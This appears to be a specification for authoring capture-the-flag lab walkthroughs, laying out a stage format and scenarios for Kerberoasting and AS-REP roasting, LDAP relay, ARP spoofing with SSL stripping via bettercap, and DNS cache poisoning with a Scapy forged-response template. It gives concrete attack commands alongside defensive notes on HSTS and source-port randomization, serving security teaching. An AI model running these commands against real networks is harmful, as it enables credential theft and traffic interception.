#### Section 1: `## Methodology`

Write a reference section (not a tutorial) covering exactly these four conventions. Future phases copy this format without modification.

**1.1 Kill-Chain Stage Format**

Each stage uses a four-field block:

```
### Stage N: [Stage Name]

**Action:** [One sentence, second person ("You ..."), imperative, names the technique not the tool]
**Command:**
[fenced code block — exact syntax, ALLCAPS placeholders, one command per line]
**Expected Output:** [Representative terminal snippet; for passive/listening stages: "Listening — no output until authentication event."]
**TTP:** [T####.### — Technique Name](https://attack.mitre.org/techniques/T####/###/) · [Tactic]
```

Rules to state in the methodology:
- Stage name identifies the attack technique, not the tool (e.g., "Kerberoasting" not "Running GetUserSPNs.py")
- Action is written in second person: "You request...", "You enumerate..."
- Command block uses ALLCAPS for all values students must substitute (IP addresses, domain names, usernames, passwords, file paths)
- Expected Output is truncated/representative — just enough for the student to confirm they are on track
- TTP: one primary TTP per stage; if a stage maps to multiple techniques list both separated by ` · `; no more than three TTPs per stage; cite via inline hyperlink to attack.mitre.org

**1.2 Flag Placement Convention**

Flags are dedicated stages with `[FLAG N]` prefixed to the stage heading. They are never inline notes inside an Action field.

Flag stage format:
```
### [FLAG N] Stage N: Flag Capture — [Location Description]

**Action:** You retrieve Flag N from [location].
**Command:**
[command to read the flag]
**Expected Output:** `CTF{...flag_value_placeholder...}`
**TTP:** — (flag capture, not an adversarial technique)
```

Justify in the methodology: placing flags as stages keeps narrative flow intact, makes multi-flag scenarios (AD-05) unambiguous, and lets instructors locate the flag stage and verify the correct preceding access step.

**1.3 VM Role Labeling**

Use functional role names, not OS names or VM numbers:

| Role | Label | When to tag |
|------|-------|-------------|
| Kali attacker VM | `[Attacker]` | Only when a stage command runs on the victim; omit if all commands run on attacker |
| Windows Domain Controller | `[DC]` | When command executes on DC |
| Windows member server | `[MemberSrv]` | When command executes on member server |
| Ubuntu pivot / service host | `[PivotHost]` | When command executes on Ubuntu victim |

Add the role tag in parentheses after the stage name heading when needed: `### Stage N: Kerberoasting from Foothold [MemberSrv]`

Justify: VM numbers are brittle across scenarios with different counts; OS names are redundant with VM profiles; functional role names are self-documenting.

**1.4 TTP Citation Style**

Inline hyperlink at the end of each stage, format: `[T####.### — Technique Name](URL) · Tactic`

For flag capture stages: `**TTP:** —` (no technique applies).

For stages with ASSUMED mappings (mitm6 → T1557.001; WriteDACL → T1222.001): include a brief note after the TTP line explaining the mapping rationale, e.g., "Note: mitm6 is not explicitly named in T1557.001 procedure examples; mapping is by structural equivalence to the LLMNR/NBT-NS poisoning mechanism."

**AD-01 — Kerberoasting and AS-REP Roasting**

VMs: Attacker (Kali), DC (Windows Server 2019, `corp.local`)

Stages:
1. SPN Enumeration — use both `GetUserSPNs.py CORP.LOCAL/LOWPRIV:PASSWORD -dc-ip DC_IP -request -outputfile tgs.hashes` and `nxc ldap DC_IP -u LOWPRIV -p PASSWORD --kerberoast tgs.hashes` as alternatives in the same command block. TTP: T1087.002 · Discovery
2. TGS Ticket Harvest — separate stage to make the ticket-request mechanism explicit. Expected output: `$krb5tgs$23$*svc_sql$CORP.LOCAL$...` (one line per SPN). TTP: T1558.003 · Credential Access
3. AS-REP Enumeration — `GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat` and `nxc ldap DC_IP -u LOWPRIV -p PASSWORD --asreproast asrep.hashes` as alternatives. Expected output: `$krb5asrep$23$USER@CORP.LOCAL:...`. TTP: T1558.004 · Credential Access
4. Offline Hash Cracking — three hashcat commands with modes: 13100 (RC4 TGS, `$krb5tgs$23$`), 19600 (AES-128 TGS, `$krb5tgs$17$`), 19700 (AES-256 TGS, `$krb5tgs$18$`), 18200 (AS-REP). State explicitly: inspect the first characters of the hash before choosing the mode. Use `/usr/share/wordlists/rockyou.txt`. TTP: T1110.002 · Credential Access
5. [FLAG 1] Flag Capture — cracked credential unlocks a protected share; flag is a file in that share. Command: `smbclient \\\\DC_IP\\flag_share -U CORP.LOCAL\\SVC_ACCOUNT%CRACKED_PASSWORD` then `get flag.txt`.

Pitfall note (include as a "Note" subsection after the kill-chain): Service accounts configured with AES-only (`msDS-SupportedEncryptionTypes` locked) produce `$krb5tgs$17$` or `$krb5tgs$18$` hashes — mode 13100 will load 0 hashes. Check the prefix before running hashcat.

VMs: Attacker (Kali), MemberSrv (Windows Server 2019, SMB signing off)

**NET-02 — IPv6 Rogue DHCPv6 and LDAP Relay**

VMs: Attacker (Kali), DC (Windows Server 2019, `corp.local`)

TTP: T1557.001 · Credential Access. LDAPS requirement note (after Stage 1): "ntlmrelayx MUST relay to `ldaps://` (port 636, TLS), not `ldap://` (port 389). Modern Windows rejects account creation via plaintext LDAP. If you use `ldap://`, the relay appears to succeed but no computer account is created. Verify: `nxc ldap DC_IP -u LOWPRIV -p PASSWORD --computers` — ROGUE_PC$ will be absent if LDAP (not LDAPS) was used."

**NET-03 — ARP Cache Poisoning and Credential Interception**

VMs: Attacker (Kali), Victim-A (sending credentials), Victim-B (service receiving credentials)

Stages:
1. Host and Gateway Discovery — `sudo arp-scan -l` or `nmap -sn SUBNET/24`. Identify Victim-A IP, Victim-B IP. TTP: T1046 · Discovery
2. ARP Cache Poisoning — launch bettercap interactive console, then:
   ```
   set arp.spoof.targets VICTIM_IP_A,VICTIM_IP_B
   set arp.spoof.fullduplex true
   arp.spoof on
   ```
   Full-duplex means both hosts' ARP caches are poisoned simultaneously. TTP: T1557.002 · Credential Access
3. HTTPS Downgrade via SSL Strip — continue in bettercap console:
   ```
   set https.proxy.sslstrip true
   https.proxy on
   net.sniff on
   ```
   Expected output: bettercap captures HTTP POSTs: `[net.sniff] POST /login -> username=admin&password=FLAG_PASSWORD`. TTP: T1557.002 · Credential Access and T1040 · Credential Access
4. [FLAG 1] Flag Capture — use captured credentials: `curl -u admin:FLAG_PASSWORD http://VICTIM_IP_B/flag`.

HSTS note (after Stage 3): "This attack works only against services without HSTS (HTTP Strict Transport Security). The lab's flag service is intentionally configured to serve over HTTP or HTTPS without HSTS headers. Sites with HSTS preloading (e.g., Google) cannot be SSL-stripped — the browser refuses to initiate plaintext connections regardless of ARP poisoning. HSTS is the primary defense against this attack class."

**NET-04 — DNS Cache Poisoning**

VMs: Attacker (Kali), DNS Resolver (Ubuntu 22.04 with unbound/bind9, misconfigured — fixed source port)

Stages:
1. DNS Resolver Discovery — `nmap -p 53 -sU SUBNET/24`. Identify UDP/53 open hosts. Confirm recursive resolution: `dig @RESOLVER_IP internal.corp.local`. TTP: T1046 · Discovery
2. Misconfiguration Verification — confirm source port is not randomized: send several queries and observe the source port is always 53 or constant. `for i in $(seq 1 20); do dig @RESOLVER_IP test$i.corp.local +short; done` while capturing with `sudo tcpdump -i eth0 udp port 53 -n`. If source port is fixed, the TXID space (16-bit, 65536 values) can be covered by a flood. TTP: T1046 · Discovery
3. DNS Cache Poisoning via Scapy — students write this script themselves. Provide the complete template:

   The script does three things: (a) triggers a DNS query from the resolver to upstream for `internal-service.corp.local`; (b) simultaneously sniffs for the resolver's outgoing query to observe the TXID; (c) sends a flood of forged DNS responses from the spoofed upstream authoritative IP with all possible TXIDs until one matches and the resolver caches it.

   Key Scapy imports: `from scapy.all import *` and `from scapy.layers.dns import DNS, DNSQR, DNSRR`. OSPF is not needed here — only DNS layers.

   The forged response packet structure:
   - IP layer: `src=UPSTREAM_DNS_IP` (spoofed), `dst=RESOLVER_IP`
   - UDP layer: `sport=53`, `dport=RESOLVER_SOURCE_PORT` (53 if fixed)
   - DNS layer: `id=TXID, qr=1, aa=1, rd=1, ra=1`
   - Question: `DNSQR(qname="internal-service.corp.local")`
   - Answer: `DNSRR(rrname="internal-service.corp.local", rdata=ATTACKER_IP, ttl=3600)`

   The sniff callback observes the TXID from the resolver's outgoing query and immediately sends the spoofed response. In the lab's simplified variant (fixed source port, no TXID randomization), a single matching packet poisons the cache.

   TTP: T1557 · Credential Access

4. Intercept Redirected HTTP Request — after cache is poisoned, start `sudo nc -lvnp 80`. The internal service sends its heartbeat/check HTTP request to ATTACKER_IP. Expected output:
   ```
   GET /api/heartbeat HTTP/1.1
   Host: internal-service.corp.local
   X-Flag: CTF{...}
   ```
   TTP: T1040 · Collection

DNS Cache Poisoning note (after Stage 3): "The lab resolver is pre-configured with a fixed source port (no source port randomization) — this reduces the attack to guessing a 16-bit TXID space, which a flood covers in under a second. In real networks with RFC 5452 source port randomization, the combined search space (16-bit port × 16-bit TXID = 32 bits) makes this attack impractical without an amplification vulnerability. The lab's deliberate misconfiguration demonstrates why RFC 5452 compliance matters."

dnschef alternative (include as a one-paragraph note after Stage 3): "dnschef can replace the Scapy script as a verification step: `sudo dnschef --interface ATTACKER_IP --fakeip ATTACKER_IP --fakedomains internal-service.corp.local`. Use it to confirm cache poisoning is working after your Scapy script succeeds — it does not teach DNS packet structure. The Scapy approach is the primary path."
